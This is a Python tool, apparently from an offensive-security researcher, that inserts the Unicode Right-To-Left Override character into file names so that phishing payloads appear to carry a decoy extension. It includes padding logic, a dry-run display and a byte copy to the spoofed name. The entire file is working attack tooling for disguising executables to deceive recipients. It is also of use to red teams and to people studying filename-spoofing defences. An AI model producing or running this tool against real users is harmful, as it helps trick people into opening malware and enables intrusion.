#!/usr/bin/python3
#
# A script abusing Right-To-Left Override unicode byte to rename phishing payloads.
#
# Sources:
#   - http://unicode.org/reports/tr36/#Bidirectional_Text_Spoofing
#   - https://www.mozilla.org/en-US/security/advisories/mfsa2009-62/
#   - https://krebsonsecurity.com/2011/09/right-to-left-override-aids-email-attacks/
#   - https://twitter.com/ffforward/status/1486743442801704974
#
# Mariusz Banach, mgeeky, "22
# <mb [at] binary-offensive.com>
#

import os, sys
import shutil
import string
import argparse

RTLO = '\u202E'      # Right-To-Left Override


def opts(argv):
    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <filename> <decoy-extension>')
    parser.add_argument('filename', help='Payload file that we wish to rename.')
    parser.add_argument('decoy_extension', help='Extension that we wish our payload to mimic via RTLO')
    parser.add_argument('-p', '--padding', default=' ', help='If current file extension length is different than decoy extension length, pad filename with this character. Default: space.')
    parser.add_argument('-n', '--dryrun', action='store_true', help='Dry run. Do not rename file, just show how it would look like.')

    args = parser.parse_args()

    args.filename = os.path.abspath(args.filename)

    if args.decoy_extension.startswith('.'): 
        args.decoy_extension = args.decoy_extension[1:]

    if '.' not in args.filename:
        print('[!] Input filename does not have extension! You must point this script to the existing file having some original extension.')
        sys.exit(1)

    if not args.dryrun:
        if not os.path.isfile(args.filename):
            print('[!] Input file does not exist!')
            sys.exit(1)

    return args

def main(argv):
    print('''
    :: Dancing Right-To-Left
    
    A script abusing Right-To-Left Override unicode byte to rename phishing payloads.

    Mariusz Banach / mgeeky '22, (@mariuszbit)
    <mb@binary-offensive.com>
''')

    args = opts(argv)
    if not args:
        return False

    filename, ext = os.path.splitext(args.filename)
    filename2 = os.path.basename(filename)
    ext = ext.replace('.', '')

    if len(ext) == 0:
        print('[!] Input filename does not have extension! You must point this script to the existing file having some original extension.')
        sys.exit(1)

    targetext = args.decoy_extension[::-1]
    q = ''

    if len(targetext) < len(ext):
        filename2 += (len(ext) - len(targetext)) * args.padding
        q = '"'

    elif len(targetext) > len(ext):
        filename2 += (len(targetext) - len(ext)) * args.padding
        q = '"'

    out1 = filename2 + '\\u202e' + targetext + '.' + ext
    rest = targetext + '.' + ext
    out2 = filename2 + rest[::-1]
    out3 = filename2 + RTLO + targetext + '.' + ext

    print(f'''INPUT:

    Payload Filename                                 :  {os.path.basename(args.filename)}
    Payload Extension                                :  .{ext}
    Decoy payloads' extension as                     :  .{args.decoy_extension}

OUTPUT:

    Your file was named in following way             :  {q}{out1}{q}

    Your filename will look like this (simulated)    :  {q}{out2}{q}
    Your filename will look like this (real display) :  {out3}
''')

    old = args.filename
    new = os.path.dirname(old) + os.sep + filename2 + RTLO + targetext + '.' + ext
    
    #
    # Using manual bytes copy cause I was having some weird issues with shutil.copy()
    # 
    if not args.dryrun:
        with open(old, 'rb') as oldfile:
            with open(new, 'wb') as newfile:
                newfile.write(oldfile.read())
    else:
        print('Dry run. Did not rename the actual file.')

if __name__ == '__main__':
    main(sys.argv)
